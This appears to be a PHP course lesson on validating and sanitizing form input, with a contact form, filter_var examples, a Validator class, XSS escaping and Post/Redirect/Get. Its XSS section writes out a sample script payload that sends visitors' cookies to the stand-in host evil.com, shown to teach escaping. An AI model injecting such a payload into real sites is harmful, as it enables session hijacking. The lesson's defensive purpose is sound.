
Forms are the primary way users push data into your application. Every piece of data that arrives via a form is a string, comes from an untrusted source, and must be validated and sanitized before you do anything with it. This is not optional defensive programming — it is the baseline.

## The mental model — never trust input

```
User submits form
       ↓
Raw strings arrive in $_POST / $_GET
       ↓
Validate — does this data meet our requirements?
       ↓
Sanitize — clean it for safe use/display
       ↓
Use it — database, file, email, display
```

Validation and sanitization are different operations. Validation asks "is this data acceptable?" and returns yes/no. Sanitization transforms data to make it safe for a specific context. You always validate first — if data is invalid, reject it. Sanitizing bad data and using it anyway is a common mistake.

## A self-processing form — the pattern

A single PHP file that handles both displaying the form and processing its submission:

```php
<?php
declare(strict_types=1);

$errors = [];
$values = ["name" => "", "email" => "", "message" => ""];
$success = false;

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Read raw input
    $values["name"]    = $_POST["name"]    ?? "";
    $values["email"]   = $_POST["email"]   ?? "";
    $values["message"] = $_POST["message"] ?? "";

    // Validate
    if (trim($values["name"]) === "") {
        $errors["name"] = "Name is required.";
    } elseif (strlen(trim($values["name"])) < 2) {
        $errors["name"] = "Name must be at least 2 characters.";
    }

    if (trim($values["email"]) === "") {
        $errors["email"] = "Email is required.";
    } elseif (!filter_var($values["email"], FILTER_VALIDATE_EMAIL)) {
        $errors["email"] = "Please enter a valid email address.";
    }

    if (trim($values["message"]) === "") {
        $errors["message"] = "Message is required.";
    } elseif (strlen(trim($values["message"])) < 10) {
        $errors["message"] = "Message must be at least 10 characters.";
    }

    // Only proceed if no errors
    if (empty($errors)) {
        // Process... (save to DB, send email, etc.)
        $success = true;
        $values  = ["name" => "", "email" => "", "message" => ""];
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Contact</title></head>
<body>
<?php if ($success): ?>
    <p style="color:green">Message sent successfully.</p>
<?php endif; ?>

<form method="POST">
    <div>
        <label>Name</label><br>
        <input type="text" name="name" value="<?= htmlspecialchars($values["name"]) ?>">
        <?php if (isset($errors["name"])): ?>
            <span style="color:red"><?= htmlspecialchars($errors["name"]) ?></span>
        <?php endif; ?>
    </div>

    <div>
        <label>Email</label><br>
        <input type="email" name="email" value="<?= htmlspecialchars($values["email"]) ?>">
        <?php if (isset($errors["email"])): ?>
            <span style="color:red"><?= htmlspecialchars($errors["email"]) ?></span>
        <?php endif; ?>
    </div>

    <div>
        <label>Message</label><br>
        <textarea name="message"><?= htmlspecialchars($values["message"]) ?></textarea>
        <?php if (isset($errors["message"])): ?>
            <span style="color:red"><?= htmlspecialchars($errors["message"]) ?></span>
        <?php endif; ?>
    </div>

    <button type="submit">Send</button>
</form>
</body>
</html>
```

Three things to notice: values are repopulated after a failed submission so users don't retype everything. Every output goes through `htmlspecialchars()`. Validation runs server-side regardless of what the browser does — browser-side HTML5 validation is a UX convenience, not a security control.

## filter_var — PHP's built-in validation toolkit

```php
<?php
declare(strict_types=1);

// Email
var_dump(filter_var("george@example.com", FILTER_VALIDATE_EMAIL));  // string
var_dump(filter_var("not-an-email",       FILTER_VALIDATE_EMAIL));  // false

// URL
var_dump(filter_var("https://example.com", FILTER_VALIDATE_URL));   // string
var_dump(filter_var("not a url",           FILTER_VALIDATE_URL));   // false

// Integer — with range options
$options = ["options" => ["min_range" => 1, "max_range" => 100]];
var_dump(filter_var("42",  FILTER_VALIDATE_INT, $options));   // string "42"
var_dump(filter_var("200", FILTER_VALIDATE_INT, $options));   // false (out of range)
var_dump(filter_var("abc", FILTER_VALIDATE_INT, $options));   // false

// Float
var_dump(filter_var("3.14", FILTER_VALIDATE_FLOAT));   // string "3.14"
var_dump(filter_var("abc",  FILTER_VALIDATE_FLOAT));   // false

// IP address
var_dump(filter_var("192.168.1.1", FILTER_VALIDATE_IP));         // string
var_dump(filter_var("192.168.1.1", FILTER_VALIDATE_IP,
                    FILTER_FLAG_IPV4));                          // IPv4 only

// Boolean — recognises "true", "false", "1", "0", "on", "off", "yes", "no"
var_dump(filter_var("true",  FILTER_VALIDATE_BOOLEAN));   // true
var_dump(filter_var("false", FILTER_VALIDATE_BOOLEAN));   // false
var_dump(filter_var("yes",   FILTER_VALIDATE_BOOLEAN));   // true
var_dump(filter_var("maybe", FILTER_VALIDATE_BOOLEAN));   // null
```

`filter_var` returns `false` on failure (not null, not 0 — `false`). Always check with `=== false`.

## Sanitization — cleaning data for safe use

```php
<?php
declare(strict_types=1);

$dirty = "  <script>alert('xss')</script> Hello, World!  ";

// Sanitize for HTML output — strips tags, encodes special chars
$clean = htmlspecialchars(trim($dirty), ENT_QUOTES | ENT_HTML5, "UTF-8");
echo $clean . "\n";
// &lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt; Hello, World!

// Strip all HTML tags
$stripped = strip_tags($dirty);
echo $stripped . "\n";
// alert('xss') Hello, World!

// filter_var sanitizers — remove illegal characters
$email   = filter_var(" george @example.com ", FILTER_SANITIZE_EMAIL);
$url     = filter_var("https://exam ple.com/pa th", FILTER_SANITIZE_URL);
$integer = filter_var("42abc", FILTER_SANITIZE_NUMBER_INT);   // "42"
$float   = filter_var("3.14xyz", FILTER_SANITIZE_NUMBER_FLOAT,
                       FILTER_FLAG_ALLOW_FRACTION);            // "3.14"

// Important: FILTER_SANITIZE_STRING was removed in PHP 8.1
// Use htmlspecialchars() instead for string sanitization
```

The most important one is `htmlspecialchars()`. Use it on every piece of user-supplied data that you output into HTML — no exceptions. The second argument `ENT_QUOTES` ensures both single and double quotes are encoded.

## A reusable validator class

Writing validation inline gets messy fast. A simple validator keeps it organized:

```php
<?php
declare(strict_types=1);

class Validator {
    private array $errors  = [];
    private array $data    = [];

    public function __construct(private readonly array $input) {}

    public function required(string $field, string $label): static {
        $value = trim($this->input[$field] ?? "");
        if ($value === "") {
            $this->errors[$field] = "$label is required.";
        } else {
            $this->data[$field] = $value;
        }
        return $this;
    }

    public function minLength(string $field, int $min, string $label): static {
        $value = trim($this->input[$field] ?? "");
        if ($value !== "" && strlen($value) < $min) {
            $this->errors[$field] = "$label must be at least $min characters.";
        }
        return $this;
    }

    public function maxLength(string $field, int $max, string $label): static {
        $value = trim($this->input[$field] ?? "");
        if (strlen($value) > $max) {
            $this->errors[$field] = "$label must not exceed $max characters.";
        }
        return $this;
    }

    public function email(string $field, string $label): static {
        $value = trim($this->input[$field] ?? "");
        if ($value !== "" && filter_var($value, FILTER_VALIDATE_EMAIL) === false) {
            $this->errors[$field] = "$label must be a valid email address.";
        }
        return $this;
    }

    public function integer(
        string $field,
        string $label,
        ?int $min = null,
        ?int $max = null
    ): static {
        $value = trim($this->input[$field] ?? "");
        if ($value === "") return $this;

        $options = [];
        if ($min !== null) $options["min_range"] = $min;
        if ($max !== null) $options["max_range"] = $max;

        $result = filter_var(
            $value,
            FILTER_VALIDATE_INT,
            $options ? ["options" => $options] : []
        );

        if ($result === false) {
            $range = match(true) {
                $min !== null && $max !== null => " between $min and $max",
                $min !== null                 => " of at least $min",
                $max !== null                 => " of at most $max",
                default                       => "",
            };
            $this->errors[$field] = "$label must be a whole number$range.";
        } else {
            $this->data[$field] = (int)$result;
        }
        return $this;
    }

    public function passes(): bool {
        return empty($this->errors);
    }

    public function errors(): array {
        return $this->errors;
    }

    public function validated(): array {
        return $this->data;
    }
}

// Usage — fluent chaining
$validator = (new Validator($_POST))
    ->required("name",    "Name")
    ->minLength("name",   2, "Name")
    ->maxLength("name",   100, "Name")
    ->required("email",   "Email")
    ->email("email",      "Email")
    ->required("message", "Message")
    ->minLength("message", 10, "Message")
    ->integer("port",     "Port", 1, 65535);

if ($validator->passes()) {
    $data = $validator->validated();
    // $data contains trimmed, validated values
} else {
    $errors = $validator->errors();
    // show errors back to the user
}
```

This is a simplified version of what Laravel's validator does. Building it yourself means you understand it completely — the framework version won't be magic when you reach Day 29.

## XSS — the attack you prevent with one function

Cross-Site Scripting (XSS) happens when user input gets rendered as HTML without escaping:

```php
<?php
declare(strict_types=1);

// Attacker submits this as their name:
$name = "<script>document.location='https://evil.com?c='+document.cookie</script>";

// WRONG — executes the script in the visitor's browser
echo "Hello, $name";

// RIGHT — renders as visible text, script never executes
echo "Hello, " . htmlspecialchars($name, ENT_QUOTES | ENT_HTML5, "UTF-8");
// Hello, &lt;script&gt;document.location=...&lt;/script&gt;
```

One rule: every variable that came from outside your code (forms, database, URL, file, API) gets `htmlspecialchars()` before it goes into HTML output. Build the habit now — it becomes automatic.

Create a helper to save typing:

```php
<?php
declare(strict_types=1);

function e(string $value): string {
    return htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, "UTF-8");
}

// Now every template line reads clearly
echo "<input value=\"" . e($userInput) . "\">";
echo "<p>" . e($description) . "</p>";
```

## The Post/Redirect/Get pattern

When a form submits successfully, always redirect. Never leave the user on a POST URL:

```php
<?php
declare(strict_types=1);

session_start();

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // validate...
    // process...

    // Store success message in session (flash message)
    $_SESSION["flash"] = "Your message was sent successfully.";

    // Redirect to GET — browser can refresh safely now
    header("Location: /contact.php");
    exit;   // always exit after header redirect
}

// On GET — show any flash message and clear it
$flash = $_SESSION["flash"] ?? null;
unset($_SESSION["flash"]);
?>
<!DOCTYPE html>
<html lang="en">
<body>
<?php if ($flash): ?>
    <p><?= htmlspecialchars($flash) ?></p>
<?php endif; ?>
<form method="POST">...</form>
</body>
</html>
```

Without the redirect, refreshing the page after a successful submit re-sends the POST — the user gets a browser "resubmit form?" dialog and your handler runs twice. Post/Redirect/Get eliminates both problems.

---

## Today's exercise

![[Pasted image 20260602230124.png]]
Part A is the full stack of today's lesson in one exercise — form, validation, sanitization, XSS prevention, file persistence, and Post/Redirect/Get all working together. The `Validator` class you build here is something you'll extend through Phase 2 and eventually replace with Laravel's validator in Phase 4. Understanding yours first means theirs makes complete sense.


Serve it with `php -S localhost:8000`, open it in your browser, and deliberately try to break it — submit empty fields, submit `<script>` tags, submit a port of 99999. A form that handles abuse gracefully is a form that's ready for real users.

